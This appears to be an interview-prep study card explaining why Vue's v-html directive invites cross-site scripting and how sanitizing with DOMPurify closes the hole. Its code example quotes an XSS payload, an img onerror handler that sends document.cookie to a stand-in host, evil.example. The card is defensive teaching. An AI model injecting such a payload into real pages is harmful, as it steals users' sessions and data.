v-html — raw markup in, raw risk in

"Why is v-html dangerous, and what's the actual attack?"

Why it matters ▾
🚨 v-html and XSS
❗ ProblemIf a string from user input or any untrusted source gets inserted as real HTML, an attacker can smuggle in a <script> tag or an event-handler attribute that runs in the viewing user's browser — stealing their session, reading their data, acting as them.
✅ Solutionv-html is the one place that bypasses Vue's normal auto-escaping, so it must only ever receive HTML that's either hard-coded or has been sanitized through a trusted library (e.g. DOMPurify) — never a raw untrusted string.
Recallv-html = no escaping at all. Untrusted input + v-html = XSS.
🔥 Easy interview recall

v-html → raw HTML, auto-escaping bypassed

{{ }} → always escaped, never parsed as markup

Think: v-html hands the browser a script it will run. {{ }} only ever hands it text to display.

🧠 Visual Mental Model — understand it in 5 seconds
⚠️ Common Trap

"It's just a style page" is not a safety argument. Any v-html binding that ultimately traces back to user-supplied content — a comment, a bio — is an XSS risk the moment that content reaches it, regardless of how trivial the page seems.

🔄 Likely Follow-up

"Does a Content-Security-Policy fully solve this instead?" No — CSP is a valuable defense-in-depth layer (it can block inline scripts/unexpected sources) but doesn't replace sanitizing the HTML itself; treat it as an additional layer, not a substitute.

🎯 Say this in the interview — the exact lines to land

"v-html inserts a string as raw HTML, bypassing Vue's normal auto-escaping — if that string comes from an untrusted source, an attacker can inject a script or event-handler payload that executes in the viewer's browser. {{ }} interpolation always renders as escaped text and is never parsed as markup."

  • v-html → raw HTML, no escaping — only ever for trusted or sanitized content.
  • {{ }} → always escaped text, the safe default.
  • User-supplied content → sanitize first (e.g. DOMPurify) before it ever reaches v-html.
  • CSP → defense-in-depth, not a replacement for sanitizing the HTML.
📖 Explanation ▾

v-html sets an element's innerHTML directly — whatever string it's given is parsed as real markup, including any <script> tag or event-handler attribute (onerror, onclick) inside it. There is no escaping step at all; that's the entire reason it exists as a separate directive from normal interpolation.

{{ }} interpolation, by contrast, always writes to a text node. A string containing <script> renders as the literal visible characters <script> on the page — never executed, because the browser never treats it as markup in the first place.

The fix for genuinely needed rich HTML from an untrusted source is a sanitizing library (e.g. DOMPurify) that strips dangerous tags/attributes before the string ever reaches v-html — not a manual blocklist of "bad" tag names, which is easy to bypass.

💻 See the code ▾
Vue 
<!-- comment.body came straight from another user's form submission -->
<p v-html="comment.body"></p>
<!-- ❌ "<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">" runs -->

The onerror handler fires the moment the broken <img> fails to load — no click needed from the victim.

Vue 
import DOMPurify from 'dompurify'

const safeHtml = computed(() => DOMPurify.sanitize(comment.body))
// template: <p v-html="safeHtml"></p>
// ✅ onerror, <script>, etc. are stripped before v-html ever sees the string

Sanitize before the string reaches v-html — never pass the raw value through and "be careful" in the template.

🧭 Use Cases — recognize these when they happen to you ▾
1 Rendering a user's comment or bio with v-html

A comment field is exactly the shape of input an attacker controls directly. A common interview trap: treating the risk as hypothetical because "no one would actually try that" — stored XSS through a comment box is one of the most common real-world XSS vectors.

RememberUser-authored text + v-html, unsanitized → assume exploitable.
2 Rendering markdown converted to HTML on a blog

A markdown renderer legitimately needs to output real HTML (headings, bold, links). Running it through DOMPurify first, then binding the result with v-html, is the standard safe pattern for this.

RememberLegitimate HTML output → still sanitize before v-html, don't skip it.
3 Rendering fully trusted, hard-coded HTML content

A string written by your own team, never touched by user input, has no injection path — v-html is genuinely safe here. The risk is specifically about where the string came from, not the directive itself.

Rememberv-html isn't banned outright — untrusted input is the actual danger.
🌍 Real-world example ▾

A support ticket system renders customer messages with formatting. If a customer's message is bound with raw v-html, a crafted message can run JavaScript in the support agent's browser the moment they open the ticket — including reading whatever internal data that agent's session can see. Sanitizing the message through DOMPurify before it ever reaches v-html closes that path.
